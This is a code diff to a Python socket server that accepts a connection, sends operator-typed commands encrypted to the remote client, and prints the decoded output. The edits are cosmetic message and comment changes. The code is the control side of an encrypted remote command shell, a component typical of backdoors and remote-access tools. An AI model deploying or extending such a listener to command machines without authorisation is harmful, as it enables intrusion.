@@ -37,21 +37,23 @@ def server():
     while True:
         connection, address = sockobj.accept()
         try:
-            print('[#] Have new connection ==>>', address)
+            print('[#] Have new connection -->', address)
             while True:
                 try:
                     cmd = str(input('#input cmd: '))
                     if cmd == 'quit':
-                        print('connection from address {} close......'.format(address))
+                        print('Connection from address {}, closing...'.format(address))
                         connection.close()
                         sockobj.close()
                     if len(str.encode(cmd)) > 0:
                         connection.send(encrypter(cmd.encode()))
                         client_data = (decrypter(connection.recv(1024)))
                         try:
-                            print(client_data.decode('utf-8', errors='ignore') + '\n')  # English
+                            # English
+                            print(client_data.decode('utf-8', errors='ignore') + '\n')
                         except:
-                            print(client_data.decode('cp866', errors='ignore') + '\n')  # Russian
+                            # Rusian
+                            print(client_data.decode('cp866', errors='ignore') + '\n')
                 except:
                     break
 
